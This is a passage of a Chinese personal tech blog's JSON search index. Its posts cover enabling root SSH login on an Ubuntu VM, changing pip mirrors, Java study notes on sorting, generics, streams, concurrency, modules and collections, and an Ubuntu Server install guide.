&lt;command&gt;&quot;.See &quot;man sudo_root&quot; for details.shanghua@ubuntu:~$ 这里我们就获得了一个 shell 就可以直接操作虚拟机里的系统了 设置 ROOT 用户12345shanghua@ubuntu:~$ sudo passwd root[sudo] password for shanghua:Enter new UNIX password:Retype new UNIX password:passwd: password updated successfully 先输入当前用户密码，然后再输入两次 ROOT 账户密码，这样就设置成功了 切换到 ROOT 用户123shanghua@ubuntu:~$ suPassword:root@ubuntu:/home/shanghua# 我们输入 su 命令，然后再输入我们刚刚设置的 ROOT 密码就可以切换到 ROOT 用户了，我们可以从命令行看到，用户从 shanghua 变成了 root 配置 SSH 允许 ROOT 用户远程连接1root@ubuntu:/home/shanghua# vi /etc/ssh/sshd_config 12#PermitRootLogin prohibit-passwordPermitRootLogin yes 修改 SSH 配置文件，将 PermitRootLogin 后面的 prohibit-password 修改为 yes 重启 SSH 服务1root@ubuntu:/home/shanghua# service ssh restart 重启后 ssh 配置文件才会生效哦 编辑 FinalShell 连接改为 root 用户 记得改密码哦，修改完成点击确定，然后打开这个连接 12连接成功root@ubuntu:~# 这样就会发现连接上后就是 root 用户了","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.shanghua.live/tags/Linux/"},{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://www.shanghua.live/tags/Ubuntu/"}]},{"title":"python 换源","slug":"Python/python换源","date":"2020-03-30T20:27:21.000Z","updated":"2021-06-20T05:12:32.389Z","comments":true,"path":"2020/03/31/Python/python换源/","link":"","permalink":"https://www.shanghua.live/2020/03/31/Python/python%E6%8D%A2%E6%BA%90/","excerpt":"环境 平台 Windows 10python 3","text":"环境 平台 Windows 10python 3 临时换源1pip install -i https://pypi.tuna.tsinghua.edu.cn/simple 永久换源在 %HOMEPATH%\\pip 目录下新建 pip.ini 文件，内容如下(如果没有 pip 文件夹，新建一个即可 ) 1234[global]timeout = 6000index-url = https://mirrors.aliyun.com/pypi/simple/trusted-host = mirrors.aliyun.com","categories":[],"tags":[{"name":"Python","slug":"Python","permalink":"https://www.shanghua.live/tags/Python/"}]},{"title":"java - 算法","slug":"Java/java-算法","date":"2020-03-30T20:27:15.000Z","updated":"2021-06-20T05:09:18.567Z","comments":true,"path":"2020/03/31/Java/java-算法/","link":"","permalink":"https://www.shanghua.live/2020/03/31/Java/java-%E7%AE%97%E6%B3%95/","excerpt":"排序算法分类 计算复杂度：最佳、最坏以及平均复杂度","text":"排序算法分类 计算复杂度：最佳、最坏以及平均复杂度 内存使用：空间复杂度 递归算法：排序算法中是否用到了递归 稳定性：当相同的健存在时，经过排序后，其值也保持相对的顺序（不发生变化） 比较排序：集合中的两个元素比较排序 串行或并行：是否运用串行或并行排序 时间复杂度表达式（Time Complexity） 表达式：Big O notation 常量时间：T(n) = O(1)(数组随机访问) 线性时间：T(n) = O(n)(在未排序数组中找最值) 对数时间：T(n) = O(n)(二级制搜索) 指数时间：T(n) = O(n^c)(冒泡排序、插入排序) 比较排序 冒泡排序(Bubble Sort)：最佳 O(n)、平均 O(n^2)、最坏 O(n^2) 插入排序(Insertion Sort)：最佳 O(n)、平均 O(n^2)、最坏 O(n^2) 快速排序(Quick Sort)：最佳 O(nlogn)、平均 O(nlong)、最坏 O(n^2) 合并排序(Merge Sort)：最佳 O(nlogn)、平均 O(nlong)、最坏 O(nlong) Tim 排序(Tim Sort)：最佳 O(n)、平均 O(nlong)、最坏 O(nlong) 内建实现 冒泡排序(Bubble Sort)：无 插入排序(Insertion Sort)：java.util.Arrays#megeSort （当排序集合数量小于 7 时） 快速排序(Quick Sort)：java.util.DualPivotQuicksort#sort（Since 1.7） 合并排序(Merge Sort)：java.util.Arrays#megeSort （1.7 之后需要激活） Tim 排序(Tim Sort)：java.util.TimSort （Since 1.7）","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://www.shanghua.live/tags/Java/"},{"name":"算法","slug":"算法","permalink":"https://www.shanghua.live/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"java 面向对象设计二","slug":"Java/java 面向对象设计二","date":"2020-03-30T20:27:00.000Z","updated":"2021-06-20T05:09:17.375Z","comments":true,"path":"2020/03/31/Java/java 面向对象设计二/","link":"","permalink":"https://www.shanghua.live/2020/03/31/Java/java%20%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E8%AE%BE%E8%AE%A1%E4%BA%8C/","excerpt":"Java 泛型设计泛型使用场景 编译时强类型转换 避免类型强转 实现通用算法","text":"Java 泛型设计泛型使用场景 编译时强类型转换 避免类型强转 实现通用算法 泛型类型A generic type is a generic class or interface that is parameterized over types. 调用泛型类型 实例化泛型 java 7 Diamond 类型参数命名约定 类型参数命名约定 E: 表示集合元素（Element） V: 表示数值（Value） K: 表示键（Key） T: 表示类型 可以参考 java.util.function.BiConsumer 类的写法 泛型有界类型参数 单界限 多界限 泛型方法和有界类型参数","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://www.shanghua.live/tags/Java/"}]},{"title":"java 函数式设计","slug":"Java/java-函数式设计","date":"2020-03-30T20:27:00.000Z","updated":"2021-06-20T05:09:17.859Z","comments":true,"path":"2020/03/31/Java/java-函数式设计/","link":"","permalink":"https://www.shanghua.live/2020/03/31/Java/java-%E5%87%BD%E6%95%B0%E5%BC%8F%E8%AE%BE%E8%AE%A1/","excerpt":"@Functionallnterface用于函数式接口类型声明的信息注解类型，这些接口的实例被 Lambda 表示式、方法引用或构造器引用创建。函数时接口只能有一个抽象方法，","text":"@Functionallnterface用于函数式接口类型声明的信息注解类型，这些接口的实例被 Lambda 表示式、方法引用或构造器引用创建。函数时接口只能有一个抽象方法，并排除默认方法以及声明中覆盖 Object 的公开方法的统计。同时 @Functionallnterface 不能标注在注解，类以及枚举上。如果违背以上规则，那么接口不能视为函数式接口，当标注 @Functionallnterface 后，会引起编译错误。 不过，如果任意接口满足以上函数式接口的要求，无论接口生命中是否标注 @Functionallnterface ，均能被编译器视作函数式接口。 函数式接口类型 提供类型 - Supplier&lt;T&gt; 消费类型 - Consumer&lt;T&gt; 转换类型 - Function&lt;T,R&gt; 断定类型 - Predicate&lt;T&gt; 隐藏类型 - Action 函数式接口设计Supplier&lt;T&gt; 接口定义 基本特点：只进不出 编程范式：作为方法/构造参数，方法的返回值 使用场景：数据来源，代码替代接口 Function&lt;T,R&gt; 接口定义 基本特点：有进有出 编程范式：作为方法/构造器参数 使用场景：类型转换、业务处理 Predicate&lt;T&gt; 接口定义 基本特点：boolean 类型判断 编程范式：作为方法/构造参数 使用场景：过滤、对象比较等 Stream API 设计Stream 基本操作 转换：Stream#map(Function) 过滤：Stream#filter(Predicate) 排序 Stream#sorted() Stream#sorted(Comparator) Stream 高级操作 Collect 操作 分组操作 聚合操作 flatMap 操作 reduce 操作 Stream 类型 串行 Stream（默认类型） 并行 Stream 转换并行 Stream：Stream#parallel() 是否并行 Stream：Stream#isParallel()","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://www.shanghua.live/tags/Java/"}]},{"title":"java 并发理论基础","slug":"Java/java-并发理论基础","date":"2020-03-30T20:27:00.000Z","updated":"2021-06-20T05:09:17.488Z","comments":true,"path":"2020/03/31/Java/java-并发理论基础/","link":"","permalink":"https://www.shanghua.live/2020/03/31/Java/java-%E5%B9%B6%E5%8F%91%E7%90%86%E8%AE%BA%E5%9F%BA%E7%A1%80/","excerpt":"同步实现 信号量 (Semaphores)：Linux、Solaris 屏障（Barriers）：Linux、Pthreads","text":"同步实现 信号量 (Semaphores)：Linux、Solaris 屏障（Barriers）：Linux、Pthreads 互斥（Mutex）：Linux、Pthreads 条件变量（Condition Variables）：Solaris、Pthreads 自旋锁（Spinlock）：Windows、Linux、Pthreads 读-写锁（Reader-Writer Lock）：Linux、Solaris、Pthreads 同步原语 - synchronized 锁定对象：对象（Object）和类（Class） 修饰范围：方法（Method）、代码块（Block） 特点：重进入（Reentrant） 方法 flages：ACC_SYNCHRONIZED 字节码：monitorenter 和 monitorexit 锁实现：Thin Lock、Inflated、HeavyWeight 实战演示 Java 线程死锁（Dead Lock） Java 线程集合（Starvation）","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://www.shanghua.live/tags/Java/"}]},{"title":"java 模块化设计","slug":"Java/java-模块化设计","date":"2020-03-30T20:27:00.000Z","updated":"2021-06-20T05:09:18.488Z","comments":true,"path":"2020/03/31/Java/java-模块化设计/","link":"","permalink":"https://www.shanghua.live/2020/03/31/Java/java-%E6%A8%A1%E5%9D%97%E5%8C%96%E8%AE%BE%E8%AE%A1/","excerpt":"java -verbose:class Java Compact 模块路径模块路径可能是单个 artiface，或者是多个 artiface 的目录，存在于宿主机器上。","text":"java -verbose:class Java Compact 模块路径模块路径可能是单个 artiface，或者是多个 artiface 的目录，存在于宿主机器上。 类路径（Class Path）的脆弱性 通过 artifaces 的 Class Path 区分类型 无法区分 artifaces 无法提前通知 artifaces 缺少 允许不同的 artifaces 定义在相同的 packages 定义类型 模块路径的差异性 定位整个模块而非类型 无论是运行时，还是编译时，在同一个目录下不允许出现同名模块 可读性（Readability）模块 com.foo.app 依赖 模块 com.foo.bar 和 java.sql，说明 java.sql 对 com.foo.app 是可读的。同时，java.sql 依赖 java.xml 和 java.logging 模块，然而这并不意味着 java.xml 或 java.logging 对 com.foo.app 可读。简言之，可读性无法跨层模块之家生效 Java 模块化迁移 非命名模块（Unnamed moudule） 类型加载于 ClassPath，而非具体模块，如遗留 jar 文件，暴露所有的 packages。 命名模块（Named modules） 所有正常的 Java 模块，packages 暴露受限于 exports – 自动模块（automatic module） 假设我们需要使用 Spring ListenableFuture API，它来自于 org.springframework:spring-core，由于该 jar 文件属于非命名模块，并且其 artifactid 为 spring-core，该 ID 命名的方式对于模块化名词是非法的。 我们能够在模块路径下能后使用”自动模块”替代 spring-core-*.jar 即使有 spring.core 模块 迁移分析 需要明确应用实现依赖的 JDK 模块 需要明确二方或三方 jar 所依赖的 JDK 模块 需要微服务化应用 迁移建议 凡是定义 module-info.java(module-info.class) 属于命名模块（java 9 + 模块化 artiface） java 9 之前的 artiface 属于命名模块 自动化模块 如果在 MANIFEST.MF 定义了 Automatic-Module-Name 属性，那么采用该属性值作为模块名称 否则，使用 jar 文件的名称(如果存在 “-“ 将其替换为”.”) Java 模块反射获取模块 获取模块 - Class#getModule() 模块接口 - Module 模块描述文件接口 - ModuleDescriptor","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://www.shanghua.live/tags/Java/"}]},{"title":"java 面向对象设计一","slug":"Java/java-面向对象设计一","date":"2020-03-30T20:27:00.000Z","updated":"2021-06-20T05:09:18.234Z","comments":true,"path":"2020/03/31/Java/java-面向对象设计一/","link":"","permalink":"https://www.shanghua.live/2020/03/31/Java/java-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E8%AE%BE%E8%AE%A1%E4%B8%80/","excerpt":"Java 接口设计通用设计","text":"Java 接口设计通用设计 类/接口名 模式：（形容词） + 名词 举例 单名词：java.lang.String 双名词：java.util.ArrayList 形容词+名词：java.util.LinkedList 可访问性 public：开放 API 使用场景 举例：java.lang.String (默认)：仅在当前 package 下使用，属于私有 API 举例：java.io.FileSystem 四种修饰符 public (default) protected : 不能用于修饰最外层 class private : 不能用于修饰最外层 class 可继承性 final：final 不具备继承性，仅用于实现类，不能与 abstract 关键字同时修饰类 举例：java.lang.String 非 final：最常见/默认的设计手段，可继承性依赖于可访问性 举例：java.io.FileSystem 具体类设计常见场景 功能组件 HashMap 接口/抽象类实现 HashMap &lt;- AbstractMap &lt;- Map 数据对象 POJO 工具辅助 *Utils ViewHelper Helper 命名模式 前缀模式：”Default”、”Generic”、”Common”、”Basic” 后缀模式：”impl” 抽象类设计抽象类常见场景 接口通用实现（模板模式） Spring *Template AbstractList AbstractSet AbstractMap 状态/行为继承 工具类 常见模式 抽象程序介于类与接口之间（java 8+ 可完全由接口替换） 以 “Abstract” 或 “Base” 类名前缀 java.util.AbstractCollection javax.sql.rowset.BaseRowSet 接口设计接口设计常见场景 上下游系统（组件）通讯契约 API RPC 常量定义 Serializable Cloneable AutoCloseable EventListener 接口设计常见模式 无状态（Stateless） 完全抽象（&lt; Java 8） 局部抽象（Java 8+） 单一抽象（Java 8 函数式接口） 内置类设计内置类常见场景 临时数据存储类：java.lang.ThreadLocal.ThreadMap 特殊用途的 API 实现：java.util.Collection.UnmodifiableCollection Builder 模式（接口）：java.util.stream.Stream.Builder Java 枚举设计“枚举类” 枚举(enum)实际是 final class， 枚举(成员)修饰符为 public static final values 是 java 编译器做的字节码提升 场景：Java 枚举（enum）引入之前的模拟枚举实现类 模式： 成员用常量表示，并且类型为当前类型 常用关键字 final 修饰 非 public 构造器 枚举基本特性 类结构（强类型） 继承 java.lang.Enum 不可显示地继承和被继承","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://www.shanghua.live/tags/Java/"}]},{"title":"进程-线程-协程","slug":"Java/进程-线程-协程","date":"2020-03-30T20:27:00.000Z","updated":"2021-06-20T05:11:08.745Z","comments":true,"path":"2020/03/31/Java/进程-线程-协程/","link":"","permalink":"https://www.shanghua.live/2020/03/31/Java/%E8%BF%9B%E7%A8%8B-%E7%BA%BF%E7%A8%8B-%E5%8D%8F%E7%A8%8B/","excerpt":"进程指计算机中已运行的程序。进程为曾经是分时系统的基本运作单位。在面向进程设计的系统中，进程是程序的基本执行实体；在面向线程设计的系统中，进程本身不是基本运行单位，而是线程的容器。程序本身只是指令、数据以及其组织形式的描述，进程才是程序的真正运行实例","text":"进程指计算机中已运行的程序。进程为曾经是分时系统的基本运作单位。在面向进程设计的系统中，进程是程序的基本执行实体；在面向线程设计的系统中，进程本身不是基本运行单位，而是线程的容器。程序本身只是指令、数据以及其组织形式的描述，进程才是程序的真正运行实例 线程操作系统能够进行运算调度的最小单位。它被包含在进程之中，是进程的实际操作单位。一条线程指的是进程中一个单一顺序的控制流，一个进程可以并发多个线程，每条线程并行执行不同的任务。在Unix System V 及 SunOS 中也被称为轻量进程，但轻量进程更多指内核线程，而把用户线程称为线程 Java 线程Green Thread （绿色线程）java 1.2 之前的 Java Thread 实现，模拟多线程并发 Native OS Thread （原生 OS 线程）java 1.2 之后 Java Thread 实现，基于 OS 线程实现，数量映射 1:1 Java 线程编程模型 &lt; Java 5：Thread、Runnable Java 5：Executor、Future、Callable Java 7：ForkJoin Java 8：CompletionStage、CompletableFuture Java 9：Flow（Publisher、Subscriber、Subscription、Processor） Java 线程池 &lt; Java 5：自定义 Thread Pool Java 5+：ExecutorService ThreadPoolExecutor ScheduledThreadPoolExecutor Java 7+ ForkJoinPool Java 并发框架 Java 5：Java Util Concurrent Java 7：Fork/Join Java 8：CompletabFuture、RxJava、Reactor Java 9：Flow API、Reactive Streams 同步最常见的编程手段，是指任务发起和执行方在同一线程完成 异步常见的提升吞吐手段，是指任务发起方和执行方在不同线程中完成 非阻塞一种编程模型，由通知状态被动的回调执行，同步或异步执行均可 POSIX 线程POSIX 线程（英文：POSIX Threads，常被缩写为 Pthreads）是 POSIX 的线程标准，定义了创建和操纵线程的一套 API 实现 POSIX 线程标准的库常被称作 Pthreads，一般用于 Unix-like POSIX 系统，如 Linux Solaris。但是 Microsoft Windows 上的实现也存在，例如直接使用 Windows API 实现的第三方库 pthreads-w32；而利用 Windows 的 SFU/SUA 子系统，则可以直接使用微软提供的一部分原生 POSIX API - https://sourceware.org/pthreads-win32/ Java 线程状态API - java.lang.Thread.State（Since 1.5） NEW：线程已创建，尚未启动 RUNNABLE：表示线程处于可运行状态，不代表一定运行 BLOCKED：被 Monitor 锁阻塞，表示当前线程在同步锁的场景运作 WAITTING：线程处于等待状态，由 Object#wait()、Thread#join() 或 LockSupport#park() TIMED_WAITTING：线程处于规定时间内的等待状态 TERMINATED：线程执行结束 使用场景线程堆栈 工具 - jstack JMX - java.lang.management.ThreadMXBean#dumpAllThreads(boolean,boolean) API - java.lang.Thread#dumpStack() 生命周期方法 启动 - java.lang.Thread#start() 停止 - java.lang.Thread#stop() 暂停 - java.lang.Thread#suspend() 恢复 - java.lang.Thread#resume() “中止” - java.lang.Thread#interrupt()、java.lang.Thread#isInterrupted()","categories":[],"tags":[]},{"title":"Java 进程管理","slug":"Java/java-进程管理","date":"2020-03-30T20:26:00.000Z","updated":"2021-06-20T05:09:18.156Z","comments":true,"path":"2020/03/31/Java/java-进程管理/","link":"","permalink":"https://www.shanghua.live/2020/03/31/Java/java-%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/","excerpt":"管理当前 JVM 进程 获取当前 JVM 进程 ID 获取当前 JVM 进程启动时间","text":"管理当前 JVM 进程 获取当前 JVM 进程 ID 获取当前 JVM 进程启动时间 获取当前 JVM 进程线程数量 获取当前 JVM 内存使用情况 退出当前 JVM 进程 管理子进程 启动子进程 进程 API 主子进程 I/O 交互 阻塞进程 退出进程","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://www.shanghua.live/tags/Java/"}]},{"title":"java 集合便利实现","slug":"Java/java-集合便利实现","date":"2020-03-30T20:26:00.000Z","updated":"2021-06-20T05:09:17.970Z","comments":true,"path":"2020/03/31/Java/java-集合便利实现/","link":"","permalink":"https://www.shanghua.live/2020/03/31/Java/java-%E9%9B%86%E5%90%88%E4%BE%BF%E5%88%A9%E5%AE%9E%E7%8E%B0/","excerpt":"接口类型 单例集合接口（Collections.singleton*） 空集合接口（Collections.empty*） 转换集合接口（Collections.*、Arrays.*） 列举集合接口（*.of(…)）","text":"接口类型 单例集合接口（Collections.singleton*） 空集合接口（Collections.empty*） 转换集合接口（Collections.*、Arrays.*） 列举集合接口（*.of(…)） 单例集合接口 List: Collections.singletonList(T) Set: Collections.singleton(T) Map: Collections.singletonMap(K,V) 设计原则：不变集合（Immutable Collection）空集合接口（Collections.empty*） 枚举：Collections.emptyEnumeration() 迭代器：emptyIterator()、emptyListIterator() List：emptyList() Set：emptySet()、emptySortedSet、emptyNavigableSet() Map：emptyMap、emptySortedMap、emptyNavigableSet() 转换集合接口（Collections.*、Arrays.*） Enumeration：Collections.enumeration(Collection) List: Collections.list(Enumeration&lt;T&gt;)、Arrays.asList(T…) Set：Collections.newSetFromMap(Map&lt;E,Boolean&gt;) Queue：Collections.asLifoQueue(Deque&lt;T&gt;) HashCode：Arrays.hashCode(…) String：Arrays.toString(…) 列举集合接口 (*.of(…)) java.util.BitSet.valueOf(…) java.util.EnumSet.valueOf(…)(Since 1.5) java.util.Stream.valueOf(…) (Since 1.8) java.util.List.valueOf(…) (Since 9) java.util.Set.valueOf(…) (Since 9) java.util.Map.valueOf(…) (Since 9) 包装接口类型 同步包装接口（java.util.Collections.synchronized*） 只读包装接口（java.util.Collections.unmodifiable*) 类型安全包装接口（java.util.Collections.checked*） JAVA 集合 特殊实现 基本介绍为特殊场景设计实现，这些实现表现出非标准性能特性，使用限制或行为。 示例说明 弱引用 Map java.util.WeakHashMap java.lang.ThreadLocal.ThreadLocalMap 对象鉴定 Map java.util.identityHashMap","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://www.shanghua.live/tags/Java/"}]},{"title":"java 集合框架基础","slug":"Java/java-集合框架基础","date":"2020-03-30T20:26:00.000Z","updated":"2021-06-20T05:09:18.051Z","comments":true,"path":"2020/03/31/Java/java-集合框架基础/","link":"","permalink":"https://www.shanghua.live/2020/03/31/Java/java-%E9%9B%86%E5%90%88%E6%A1%86%E6%9E%B6%E5%9F%BA%E7%A1%80/","excerpt":"基本组成 Collection interfaces（集合接口）","text":"基本组成 Collection interfaces（集合接口） Infrastructure（基础设施） General-purppose implementations（通用实现） Abstract implementations（抽象实现） Legacy implementations（遗留实现） Convenience implementations（便利实现） Wrapper implementations（包装实现） Special-purpose implementations（特殊实现） Array Utilities（数组工具类） java.utils.Collection 接口通用接口 java.util.List java.util.Set java.util.SortedSet java.util.NavigableSet(since java 1.6) 集合实现遗留实现 java.util.Vector java.util.Stack java.util.HashTable java.util.En","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://www.shanghua.live/tags/Java/"}]},{"title":"Java 并发锁","slug":"Java/java-并发锁","date":"2019-09-18T11:57:00.000Z","updated":"2021-06-20T05:09:17.610Z","comments":true,"path":"2019/09/18/Java/java-并发锁/","link":"","permalink":"https://www.shanghua.live/2019/09/18/Java/java-%E5%B9%B6%E5%8F%91%E9%94%81/","excerpt":"","text":"并发锁 重进入锁 - ReentrantLock 重进入读写锁 - ReentrantReadWriteLock 邮票锁 - StampedLock","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://www.shanghua.live/tags/Java/"}]},{"title":"java 函数式基础","slug":"Java/java-函数式基础","date":"2019-08-29T11:40:00.000Z","updated":"2021-06-20T05:09:17.738Z","comments":true,"path":"2019/08/29/Java/java-函数式基础/","link":"","permalink":"https://www.shanghua.live/2019/08/29/Java/java-%E5%87%BD%E6%95%B0%E5%BC%8F%E5%9F%BA%E7%A1%80/","excerpt":"匿名内部类使用场景Java 作为一门面向对象的静态语言，其封装性能够屏蔽数据结构的细","text":"匿名内部类使用场景Java 作为一门面向对象的静态语言，其封装性能够屏蔽数据结构的细 节，从而更加关注模块的功能性。其静态性也确保了 Java 强类型的特性。随着模块功能的提升，伴随而来的是复杂度的增加，代码的语义清晰依赖与开发人员抽象和命名类的或方法的能力。尽管编程思想和设计模式能够促使编程风格趋于统一，然而大多数业务系统属于面共享过程的方式，这与面向对象编程在一定程度上存在一些冲突。Java 编程语言为了解决这个问题，引入了匿名内部类的方案。 匿名内置类基本特性 无名词类 声明位置（执行模块）： static block 实例 block 方法 构造器 并非特殊类 类名称：${package}.${declared_class}.${num}.class 基本特点 基于多态（多数基于接口编程） 实现类无需名称 允许多个抽象方法 编程局限 代码臃肿 强类型约束 接口方法升级","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://www.shanghua.live/tags/Java/"}]},{"title":"java 模块化基础","slug":"Java/java-模块化基础","date":"2019-08-22T12:04:00.000Z","updated":"2021-06-20T05:09:18.401Z","comments":true,"path":"2019/08/22/Java/java-模块化基础/","link":"","permalink":"https://www.shanghua.live/2019/08/22/Java/java-%E6%A8%A1%E5%9D%97%E5%8C%96%E5%9F%BA%E7%A1%80/","excerpt":"Java 9 模块化收益 提升平台伸缩性 提升平台完整性","text":"Java 9 模块化收益 提升平台伸缩性 提升平台完整性 提升性能 模块化强封装性 并非所有 public class 都可以被运用，需要 exports 来配合 exports 所配置的 package 下必须要有 Class 负面问题 对人的要求很高（对 Class 透明化） 必须了解相关的 module-info.java 需要了解某些类的依赖 需要了解某些类的职责 个人观点 收益不大，代价不小 对团队要求极高，容易出现互喷的情况 java 9 之前采用 jar 文件管理，java 9 模块化之后，变成了 module-info.java 管理，还需要考虑与 Maven 依赖管理如何配合","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://www.shanghua.live/tags/Java/"}]},{"title":"java 面向过程","slug":"Java/java-面向过程","date":"2019-08-22T12:04:00.000Z","updated":"2021-06-20T05:09:18.333Z","comments":true,"path":"2019/08/22/Java/java-面向过程/","link":"","permalink":"https://www.shanghua.live/2019/08/22/Java/java-%E9%9D%A2%E5%90%91%E8%BF%87%E7%A8%8B/","excerpt":"核心要素 数据结构：原生类型、对象类型、数组类型、集合类型","text":"核心要素 数据结构：原生类型、对象类型、数组类型、集合类型 方法调用：访问性、返回类型、方法参数、异常等 执行流程：赋值、逻辑、迭代（循环）、递归等JAVA 中只有原生类型、对象类型 面向对象基本特性 封装性 派生性 多态性 面向对象设计模式 GOF 23：构建、结构、行为 方法设计：名称、访问性、参数、返回类型、异常 泛型设计：类级别、方法级别 异常设计：层次性、传播性 方法设计 单元：一个类或者一组类（组件） 类采用名词结构 动词过去式+名词 ContextRefreshedEven 动词 ing+名词 linitializingBean 形容词+名称 ConfigurableApplicationContext 执行：某个方法 方法命名：动词 execute callback run 方法参数：名词 异常： 根（顶层）异常 Throwable check 类型：Execption uncheck 类型：RuntimeException 不常见：Error java 1.4 java.lang.StackTraceElement 添加异常的原因（cause） 反模式：吞掉某个异常 性能：注意 fillInStackTrace() 方法开销,避免异常咱掉的深度 方法 1：JVM 参数控制栈深度（物理屏蔽） 方法 2：logback 日志框架控制堆栈输出深度（逻辑屏蔽） 泛型设计java 泛型属于编译时处理，运行时擦写。如果确认了泛型的类型，则用 T，否则用 ?","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://www.shanghua.live/tags/Java/"}]},{"title":"JsonSon 实体类与 json 字符串不匹配","slug":"Java/json2Pojo","date":"2019-08-21T23:07:15.000Z","updated":"2021-06-20T05:09:18.633Z","comments":true,"path":"2019/08/22/Java/json2Pojo/","link":"","permalink":"https://www.shanghua.live/2019/08/22/Java/json2Pojo/","excerpt":"字段名与属性名不匹配","text":"字段名与属性名不匹配 在字段上加 JsonProperty 注解 value 对应 json 字符串 12@JsonProperty(value = &quot;isebookon&quot;)private Integer ebookon; 类字段缺少 json 字符串对应的列在类上添加 @JsonIgnoreProperties 注解 12@JsonIgnoreProperties(ignoreUnknown = true)public class TbUser&#123;&#125;","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://www.shanghua.live/tags/Java/"},{"name":"Json","slug":"Json","permalink":"https://www.shanghua.live/tags/Json/"}]},{"title":"Lambda 表达式","slug":"Java/lambda","date":"2019-08-21T23:07:00.000Z","updated":"2021-06-20T05:12:17.304Z","comments":true,"path":"2019/08/22/Java/lambda/","link":"","permalink":"https://www.shanghua.live/2019/08/22/Java/lambda/","excerpt":"基本特点 流程编排清晰 函数类型编程","text":"基本特点 流程编排清晰 函数类型编程 改善代码臃肿 兼容接口升级 编程局限Contents 单一抽象方法 Lambda 调试苦难 Stream API 操作能力有限 函数式接口基本特性 所有函数式接口都引用一段执行代码 函数式接口没有固定的类型，固定模式(SCFP = Supplier + Consumer + Function + Predicate) + Action 利用方法引用来实现模型匹配","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://www.shanghua.live/tags/Java/"}]},{"title":"Ubuntu Server 18.04 X64 安装","slug":"Linux/Ubuntu-install","date":"2019-08-21T22:50:24.000Z","updated":"2021-06-20T05:11:38.603Z","comments":true,"path":"2019/08/22/Linux/Ubuntu-install/","link":"","permalink":"https://www.shanghua.live/2019/08/22/Linux/Ubuntu-install/","excerpt":"安装准备","text":"安装准备 1.Ubuntu 镜像准备，下载地址 这里使用的是阿里镜像站的镜像地址 开始安装选择语言 直接回车，选择 English 选择键盘布局 这里直接默认 Done 选择系统类型选择系统类型，第一个是安装 Ubuntu 另外两个是附带云功能的，我们不需要 直接回车，选择第一个 选择网卡我这里是 ens33，其他电脑可能有不同，不过都是 en 开头的 直接回车 选择 IP 代理 这里直接回车，不用填 选择镜像地址 这里我们可以输入阿里云镜像地址，这样后面下载东西会快很多 1http://mirrors.aliyun.com/ubuntu/ 把默认值删掉，输入阿里地址。输入后变成这样 Done 下一步 文件系统设置 这里一定要选择第二个，带 LVM （逻辑卷管理） 的，回车 选择安装磁盘 只有一个，直接回车下一步 磁盘分区，这里需要注意一下 这里有一个 14.996G free space，这怎么行，我们选择 ubuntu-lv 回车选择 Edit 然后将其改为 18.996G，也就是 max 后面的值 然后选择 save 回车，然后我们就会发现 free space 没得了，完美 然后 done 回车，这时候会弹出一个框，我们选择 continue 即可 填写用户名密码 填写完成，shanghua 是我的网名 这里密码一定要记住，不然忘记了就完蛋了 SSH 设置 这里按一下空格选中安装 SSH 服务 Done 不知道是什么页面 不用管直接 Done 最后然后等一小会就会出来这个页面 这里选择 Reboot Now 重启就完成了，重启就进入系统了","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.shanghua.live/tags/Linux/"},{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://www.shanghua.live/tags/Ubuntu/"}]}],"categories":[],"tags":[{"name":"计网","slug":"计网","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E7%BD%91/"},{"name":"加密","slug":"加密","permalink":"https://www.shanghua.live/tags/%E5%8A%A0%E5%AF%86/"},{"name":"Java","slug":"Java","permalink":"https://www.shanghua.live/tags/Java/"},{"name":"Mybatis","slug":"Mybatis","permalink":"https://www.shanghua.live/tags/Mybatis/"},{"name":"Vim","slug":"Vim","permalink":"https://www.shanghua.live/tags/Vim/"},{"name":"Maven","slug":"Maven","permalink":"https://www.shanghua.live/tags/Maven/"},{"name":"git","slug":"git","permalink":"https://www.shanghua.live/tags/git/"},{"name":"IDEA","slug":"IDEA","permalink":"https://www.shanghua.live/tags/IDEA/"},{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://www.shanghua.live/tags/elasticsearch/"},{"name":"MongoDB","slug":"MongoDB","permalink":"https://www.shanghua.live/tags/MongoDB/"},{"name":"k8","slug":"k8","permalink":"https://www.shanghua.live/tags/k8/"},{"name":"Linux","slug":"Linux","permalink":"https://www.shanghua.live/tags/Linux/"},{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://www.shanghua.live/tags/Ubuntu/"},{"name":"Python","slug":"Python","permalink":"https://www.shanghua.live/tags/Python/"},{"name":"算法","slug":"算法","permalink":"https://www.shanghua.live/tags/%E7%AE%97%E6%B3%95/"},{"name":"Json","slug":"Json","permalink":"https://www.shanghua.live/tags/Json/"}]}